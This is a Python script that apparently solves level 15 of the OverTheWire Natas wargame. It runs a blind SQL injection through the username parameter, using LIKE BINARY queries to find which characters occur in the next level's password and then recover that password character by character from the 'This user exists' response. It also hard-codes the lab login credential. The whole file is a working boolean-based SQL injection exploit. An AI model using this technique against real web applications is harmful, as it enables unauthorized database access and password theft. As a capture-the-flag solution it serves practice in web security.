import requests, time

from requests.models import Response

url = "http://natas15.natas.labs.overthewire.org"
authentication = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
password_dictionary = []

print(" ! Gathering the letters ! ")

for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
    time.sleep(0.5)
    payload = f'{url}?username=natas16"+and+password+LIKE+BINARY+"%{char}%'
    r = requests.get(payload, auth=authentication)
    if 'This user exists' in r.text:
        password_dictionary.append(char)
        print(f"Password Dictionary contains : {''.join(password_dictionary)}")

print(" ! Brute forcing the password any second now ! ")

brute_dictionary = []

for x in range(32):

    for char in password_dictionary:
        time.sleep(0.5)
        password = f"{''.join(brute_dictionary)}{char}"
        payload = f'{url}?username=natas16"+and+password+LIKE+BINARY+"{password}%'
        r = requests.get(payload, auth=authentication)
        if 'This user exists' in r.text:
            brute_dictionary.append(char)
            print(f"password is: {''.join(brute_dictionary)}")

            break
